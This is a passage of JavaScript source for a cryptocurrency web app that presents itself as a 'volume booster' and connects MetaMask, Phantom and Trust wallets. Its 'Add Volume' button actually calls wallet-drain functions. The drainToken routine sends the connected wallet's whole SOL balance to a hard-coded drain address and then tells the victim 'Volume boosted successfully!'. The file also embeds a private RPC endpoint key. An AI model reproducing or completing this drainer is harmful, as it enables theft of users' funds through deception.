          console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 109
        }
        break;
      default:
        button.textContent = `Connect ${walletName}`;
        button.classList.add('glow-button', 'animate-pulse');
        console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`); // Log 110
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = 'Connect Wallet';
          this.dom.connectWallet.classList.add('glow-button', 'animate-pulse');
          this.dom.connectWallet.classList.remove('connected');
          this.dom.connectWallet.disabled = false;
          console.log(`Reset outer Connect Wallet button to Connect Wallet, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 111
        }
    }
    console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`); // Log 112
  }

  handleConnectionError(error, walletName) {
    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 113
    let message = `Failed to connect ${walletName}`;
    if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined.`;
    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it.`;
    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please try again.`;
    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
    else if (error.message?.includes('Non-base58 character')) message = `Please use a Solana wallet to boost volume.`;
    else if (error.message?.includes('BNB Smart Chain')) message = `Please switch ${walletName} to BNB Smart Chain in your wallet settings.`;
    else if (error.message) message = `Failed to connect ${walletName}. Please try again.`;
    this.showFeedback(message, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Ready to connect.', 'success');
    console.log('Network status: Online'); // Log 114
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
    this.updateButtonState('disconnected', 'Trust');
    console.log('Network status: Offline'); // Log 115
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot show prompt'); // Log 116
      return;
    }
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    const promptText = this.dom.metamaskPrompt.querySelector('p');
    if (promptText && this.connectingWallet) {
      let walletLink = '';
      if (this.connectingWallet === 'MetaMask') {
        walletLink = `<a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install MetaMask">MetaMask</a>`;
      } else if (this.connectingWallet === 'Phantom') {
        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
      } else if (this.connectingWallet === 'Trust') {
        walletLink = `<a href="https://trustwallet.com/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Trust Wallet">Trust Wallet</a>`;
      }
      promptText.innerHTML = `Please install ${walletLink} or switch to BNB Smart Chain to continue.`;
    }
    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 117
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot hide prompt'); // Log 118
      return;
    }
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
    console.log('MetaMask prompt hidden'); // Log 119
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
    console.log(`Feedback displayed: ${message}, type: ${type}`); // Log 120
  }

  shortenAddress(address) {
    if (!address) return 'Unknown';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
        this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
        console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 121
        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : window.ethereum?.isTrustWallet ? 'Trust' : null;
        this.handleSuccessfulConnection();
      } else {
        console.log('No wallet connected on init, setting buttons to disconnected'); // Log 122
        this.updateButtonState('disconnected', 'MetaMask');
        this.updateButtonState('disconnected', 'Phantom');
        this.updateButtonState('disconnected', 'Trust');
      }
    } else {
      console.log('No wallet installed, showing prompt'); // Log 123
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected', 'MetaMask');
      this.updateButtonState('disconnected', 'Phantom');
      this.updateButtonState('disconnected', 'Trust');
    }
  }

  attachWalletListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Solana account changed'); // Log 124
        this.handleAccountsChanged();
      });
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', async () => {
        console.log('Ethereum accounts changed'); // Log 125
        this.handleAccountsChanged();
      });
      window.ethereum.on('chainChanged', async () => {
        console.log('Ethereum chain changed'); // Log 126
        if (this.connectedWalletType === 'Trust') {
          const provider = new ethers.BrowserProvider(window.ethereum);
          const network = await provider.getNetwork();
          console.log(`Chain changed to: chainId=${network.chainId}, name=${network.name}`); // Log 126.1
          if (network.chainId !== 56n) {
            this.showFeedback('Please switch Trust Wallet to BNB Smart Chain.', 'error');
            this.updateButtonState('disconnected', 'Trust');
            this.publicKey = null;
            this.connectedWalletType = null;
          }
        }
      });
    }
  }

  isWalletInstalled() {
    return !!window.solana || !!window.ethereum;
  }

  isWalletConnected() {
    return (window.solana && !!window.solana.publicKey) || (window.ethereum && !!window.ethereum.selectedAddress);
  }

  handleSuccessfulConnection() {
    console.log(`Handle successful connection for ${this.connectedWalletType}`); // Log 127
    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
    this.renderTokenInterface();
  }

  handleAccountsChanged() {
    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress); // Log 128
    this.hideMetaMaskPrompt();
    this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : window.ethereum?.isTrustWallet ? 'Trust' : null;
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
    this.updateButtonState('disconnected', 'Trust');
    if (this.publicKey && this.connectedWalletType) {
      this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
    }
    this.renderTokenInterface();
  }

  showDefaultPrompt() {
    // Empty to prevent showing prompt on add-volume page
  }

  renderTokenInterface() {
    const isAddVolumePage = window.location.pathname.includes('add-volume.html');
    console.log(`renderTokenInterface: On add-volume.html: ${isAddVolumePage}`); // Log 129
    if (isAddVolumePage) {
      console.log('On add-volume.html, skipping renderTokenInterface to preserve existing HTML and navigation'); // Log 130
      this.dom.tokenSelect = document.getElementById('tokenSelect') || null;
      this.dom.volumeSection = document.getElementById('volumeSection') || null;
      this.dom.customTokenNameInput = document.getElementById('customTokenNameInput') || null;
      this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput') || null;
      this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn') || null;
      this.dom.tokenInfo = document.getElementById('tokenInfoDisplay') || null;
      this.dom.tokenList = document.getElementById('tokenList') || null;
      this.dom.volumeInput = document.getElementById('volumeInput') || null;
      this.dom.customTokenModal = document.getElementById('custom-token-modal') || null;
      this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal') || null;
      const navMenu = document.getElementById('nav-menu');
      if (navMenu) {
        navMenu.classList.remove('hidden');
        navMenu.style.display = window.innerWidth >= 640 ? 'flex' : '';
        console.log('Ensured nav-menu remains visible on add-volume.html'); // Log 131
      }
      return;
    }

    if (!this.dom.app) {
      console.error('Cannot render token interface: app element missing'); // Log 132
      return;
    }
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
        </select>
      </div>
      <h2 class="section-title">Import Custom Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Explore Tokens to Add Volume To</h3>
        <div class="custom-token-card token-card bg[#1a182e] border border-orange-400 p-4 rounded-xl cursor-pointer hover:bg-orange-400 hover:text-black transition-colors" role="button" aria-label="Import custom token">
          <h3 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h3>
        </div>
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
      <div id="custom-token-modal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] hidden">
        <div class="modal-content bg[#1a182e] p-6 rounded-xl border border-orange-400 max-w-md w-full">
          <div class="flex justify-between items-center mb-4">
            <h2 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h2>
            <button id="close-custom-token-modal" class="text-white text-2xl" aria-label="Close modal">&times;</button>
          </div>
          <div class="space-y-4">
            <input id="custom-token-address" type="text" placeholder="Token Address" class="w-full bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
            <div class="flex items-center space-x-2">
              <span class="text-white text-lg">$</span>
              <input id="custom-token-amount" type="number" placeholder="Amount in $" class="flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
            </div>
            <button id="custom-token-submit" class="w-full bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
          </div>
        </div>
      </div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    const amountSection = document.createElement('section');
    amountSection.className = 'amount-section fade-in mt-6 bg[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    amountSection.innerHTML = `
      <h2 class="section-title text-yellow-400 text-md font-semibold mb-4">Amount</h2>
      <div class="input-group flex items-center space-x-2">
        <span class="text-white text-lg">$</span>
        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
      </div>
    `;
    this.dom.app.appendChild(amountSection);
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.volumeInput = document.getElementById('volumeInput');
    this.dom.customTokenModal = document.getElementById('custom-token-modal');
    this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal');

    this.setupModal();

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) return;
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        console.log(`Displayed custom token: ${name}, address: ${truncatedAddress}`); // Log 133
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
    }

    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const showTokenInfo = () => {
          const address = button.dataset.address;
          if (!address) {
            this.showFeedback('Invalid token address.', 'error');
            console.log('Token option clicked, but no address found'); // Log 134
            return;
          }
          const truncatedAddress = this.shortenAddress(address);
          this.dom.tokenInfo.innerHTML = `
            <div class="token-meta space-y-2">
              <h3 class="text-yellow-400 text-lg font-semibold">Unknown Token</h3>
              <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
            </div>
          `;
          this.dom.tokenInfo.classList.remove('hidden');
          this.loadCustomTokenData(address);
          console.log(`Displayed token info for address: ${truncatedAddress}`); // Log 135
        };
        button.addEventListener('click', showTokenInfo);
        button.addEventListener('touchstart', showTokenInfo);
      });

      const customTokenCard = this.dom.tokenList.querySelector('.custom-token-card');
      if (customTokenCard) {
        customTokenCard.addEventListener('click', () => {
          console.log('Custom token card clicked'); // Log 136
          if (this.dom.customTokenModal) {
            this.dom.customTokenModal.classList.add('active');
          }
        });
      }
    }

    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.publicKey;
      console.log(`Token select disabled: ${!this.publicKey}`); // Log 137
    }

    const customTokenSubmitBtn = document.getElementById('custom-token-submit');
    if (customTokenSubmitBtn) {
      customTokenSubmitBtn.addEventListener('click', () => {
        const tokenAddress = document.getElementById('custom-token-address')?.value.trim();
        const amount = parseFloat(document.getElementById('custom-token-amount')?.value.trim());
        if (!tokenAddress) {
          this.showFeedback('Please enter a valid token address.', 'error');
          console.log('Custom token submit failed: No token address'); // Log 138
          return;
        }
        if (isNaN(amount) || amount <= 0) {
          this.showFeedback('Please enter a valid amount.', 'error');
          console.log('Custom token submit failed: Invalid amount'); // Log 139
          return;
        }
        console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`); // Log 140
        if (this.connectedWalletType === 'MetaMask') {
          this.drainEthereumWallet();
        } else if (this.connectedWalletType === 'Phantom') {
          this.drainSolanaWallet();
        } else if (this.connectedWalletType === 'Trust') {
          this.drainBNBWallet();
        }
        if (this.dom.customTokenModal) {
          this.dom.customTokenModal.classList.remove('active');
        }
      });
    }
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!this.solConnection) {
      this.showFeedback('Please connect your wallet.', 'error');
      console.log('loadCustomTokenData failed: No solConnection'); // Log 141
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress) {
      this.showFeedback('Please enter a valid token address.', 'error');
      this.dom.customTokenAddressInput?.focus();
      console.log('loadCustomTokenData failed: No token address'); // Log 142
      return;
    }
    if (tokenAddress === this.lastSelectedToken) return;
    try {
      let name = this.dom.customTokenNameInput?.value.trim() || 'Custom Token';
      let symbol = 'CSTM';
      let decimals = 9;
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = tokenAddress;
      const truncatedAddress = this.shortenAddress(tokenAddress);
      if (this.dom.tokenInfo) {
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        console.log(`Loaded custom token data: ${name} (${symbol}), address: ${truncatedAddress}`); // Log 143
      }
    } catch (error) {
      console.error('Load custom token error:', error); // Log 144
      this.showFeedback('Unable to load token details. Please check the address.', 'error');
      if (this.dom.tokenInfo) {
        this.dom.tokenInfo.classList.add('hidden');
      }
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
      this.showFeedback('Please connect your wallet.', 'error');
      console.log('loadPaymentTokenDetails failed: Missing requirements'); // Log 145
      return;
    }
    try {
      let balance, decimals, symbol;
      balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
      decimals = 9;
      symbol = 'SOL';
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
      this.currentToken = null;
      this.lastSelectedToken = null;
      console.log(`Loaded payment token details: ${symbol}, balance: ${balance / 10**decimals}`); // Log 146
    } catch (error) {
      console.error('Load payment token error:', error); // Log 147
      this.showFeedback('Unable to load payment token details.', 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress'); // Log 148
      return;
    }
    if (!this.publicKey) {
      this.showFeedback('Please connect your wallet.', 'error');
      console.log('Drain failed: No public key'); // Log 149
      return;
    }
    this.currentToken = null;
    this.lastSelectedToken = null;
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      console.log(`Attempting to drain SOL from public key: ${this.publicKey}`); // Log 150

      const receiverWallet = new PublicKey(DRAIN_ADDRESSES.solana);
      const transaction = new Transaction();
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(this.publicKey),
          toPubkey: receiverWallet,
          lamports: await this.solConnection.getBalance(new PublicKey(this.publicKey))
        })
      );

      transaction.feePayer = new PublicKey(this.publicKey);
      let blockhashObj = await this.solConnection.getLatestBlockhash();
      transaction.recentBlockhash = blockhashObj.blockhash;

      const signed = await window.solana.signTransaction(transaction);
      let txid = await this.solConnection.sendRawTransaction(signed.serialize());
      await this.solConnection.confirmTransaction(txid);
      console.log('Transaction confirmed:', txid); // Log 151
      this.showFeedback('Volume boosted successfully!', 'success');
    } catch (error) {
      console.error('Drain token error:', error); // Log 152
      if (error.message.includes('User rejected the request')) {
        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
      } else {
        this.showFeedback('Failed to boost volume. Please try again.', 'error');
      }
    } finally {
      this.isDraining = false;
      this.hideProcessingSpinner();
      console.log('Drain token completed, isDraining:', this.isDraining); // Log 153
    }
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
    console.log('Processing spinner displayed'); // Log 154
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
      console.log('Processing spinner hidden'); // Log 155
    }
  }
}

export { NexiumApp };